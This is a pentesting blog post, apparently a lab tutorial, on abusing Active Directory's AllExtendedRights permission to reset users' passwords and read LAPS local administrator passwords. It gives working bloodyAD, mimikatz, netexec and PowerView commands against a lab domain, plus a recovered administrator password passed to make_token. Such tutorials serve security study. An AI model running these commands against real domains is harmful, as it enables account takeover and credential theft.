---
title: ⚔️DACL - AllExtendedRights
date: 2025-10-28 01:08:00 +/-TTTT
categories: [DACL]
tags: [AllExtendedRights]     # TAG names should always be lowercase
image : /assets/images/allextendedrightsbackground.png
---
> Author : lineeralgebra
{:.prompt-tip}

# **AllExtendedRights on User → User (ForceChangePassword)**

When **one user has `AllExtendedRights` over another user**, it usually means they can perform sensitive control actions on that account.

On **user objects**, the most impactful extended right included in `AllExtendedRights` is **ForceChangePassword**. This right allows the attacker to reset the target user’s password **without needing to know the old one**.

In practice, having `AllExtendedRights` on a user is almost the same as having **ResetPassword/ForceChangePassword** — because the attacker can immediately take over the account by setting a new password and authenticating as that user.

So, if you see **User → User (AllExtendedRights)** in tools like BloodHound, you can usually interpret it as:

> “This user can reset that user’s password and take over their account.”
> 

Thats why i talked about **ForceChangePassword btw.**

## **AllExtendedRights on User → User happening why?**

Before start lets learn why is happening? where to check and verify?

We have to open `dsa.msc` → ADUC first and make sure its enabled.

1. Go to the **Security** tab.
    - If you don’t see it: in ADUC, click **View → Advanced Features**, then open Properties again.
2. Click **Advanced**.

Now we can go our target to verify

1. We can go our target directly and `right click` and select `Properties`  After u select victim user and check `Permissions` 

![alt text](../assets/images/dacl109.png)
When we select **All Extended Rigts** other permissions will come automatically.

## **AllExtendedRights on User → User Verify**

### **AllExtendedRights on User → User Verify w find-aces**

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

```bash
(.venv) ➜  find-aces git:(main) ✗ python3 main.py --auth "ldap+ntlm-password://lab.local\\donald:trump@VALENOR-DC01.lab.local"
Type 'help' to see available commands.
$ 

```

and just give 

```bash
find_object_aces <username> - Search for ACEs for a specific user                                                                                            
```

![alt text](../assets/images/dacl110.png)
Very strong tool!!!

### **AllExtendedRights on User → User Verify w Bloodhound**

And off course easiest and common way is bloodhound

![alt text](../assets/images/dacl111.png)


## **AllExtendedRights on User → User Attack**

As we said with **AllExtendedRights** we have `Account TakeOver` and we can do Reset user password

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u donald -p trump set password biden NewPassword123!
[+] Password changed successfully!
```

or with C2

```bash
mimikatz lsadump::setntlm /user:biden /password:VeryStrongPass1! /server:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl112.png)

# **AllExtendedRights on User → Computer (LAPS)**

We cannot  change Computer password off course and we have to do resolve **LAPS** !!!  

LAPS (Local Administrator Password Solution) falls under the category of credential management and privilege escalation prevention in Active Directory environments. In the context of pentesting or red teaming, it is most relevant to:

## **AllExtendedRights on User → Computer happening why?**

Before start lets learn why is happening? where to check and verify?

We have to open `dsa.msc` → ADUC first and make sure its enabled.

1. Go to the **Security** tab.
    - If you don’t see it: in ADUC, click **View → Advanced Features**, then open Properties again.
2. Click **Advanced**.

Now we can go our target to verify

1. We can go our target directly and `right click` and select `Properties`  After u select victim user and check `Permissions` 
    
![alt text](../assets/images/dacl113.png)
    

When we select **All Extended Rigts** other permissions will come automatically.

## **AllExtendedRights on User → User Verify**

### **AllExtendedRights on User → User Verify w find-aces**

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

```bash
(.venv) ➜  find-aces git:(main) ✗ python3 main.py --auth "ldap+ntlm-password://lab.local\\donald:trump@VALENOR-DC01.lab.local"
Type 'help' to see available commands.
$ 

```

and just give 

```bash
find_object_aces <username> - Search for ACEs for a specific user                                                                                            
```

![alt text](../assets/images/dacl114.png)

### **AllExtendedRights on User → Computer Verify w Bloodhound**

And off course easiest and common way is bloodhound

![alt text](../assets/images/dacl115.png)

## **AllExtendedRights on User → Computer Attack(LAPS) - Linux Abuse**

We can do with bloodyAD and netexec in easy way

```bash
nxc smb VALENOR-DC01.lab.local -u donald -p trump --laps
```

or

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u donald -p trump get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

![alt text](../assets/images/dacl116.png)

## **AllExtendedRights on User → Computer Attack(LAPS) - C2 Abuse**

Lets see if we have AdmPwd.dll at;

Command to execute:

```
ls C:\Program Files\LAPS\CSE
```

![alt text](../assets/images/dacl117.png)

Check for, Computer Object having `ms-Mcs-AdmPwdExpirationTime` attribute is set to Not Null.

Commands to execute;

```bash
powershell-import /home/elliot/tools/PowerView.ps1
powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
```

![alt text](../assets/images/dacl118.png)

Now lets get Admin Password Command to execute

```bash
powerpick Get-DomainComputer -Identity VALENOR-DC01.lab.local  -Properties ms-Mcs-AdmPwd
```

![alt text](../assets/images/dacl119.png)

now we can make token for Administrator and get access.

```bash
make_token .\Administrator VS-ni-q;qNg70#
```

![alt text](../assets/images/dacl120.png)
